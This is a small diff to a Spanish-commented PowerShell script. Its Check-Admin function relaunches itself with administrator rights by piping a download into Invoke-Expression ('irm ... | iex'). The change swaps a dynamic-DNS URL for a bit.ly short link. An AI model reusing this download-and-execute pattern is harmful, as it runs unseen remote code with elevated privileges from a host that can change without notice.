@@ -9,7 +9,7 @@ $distancia = 30
 function Check-Admin {
     # Comprobar si el script se está ejecutando como administrador
     if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-Command irm https://mdk.ddns.net/cmd/info | iex"
+        Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-Command irm https://bit.ly/infosyswin | iex"
         Exit
     }
 }
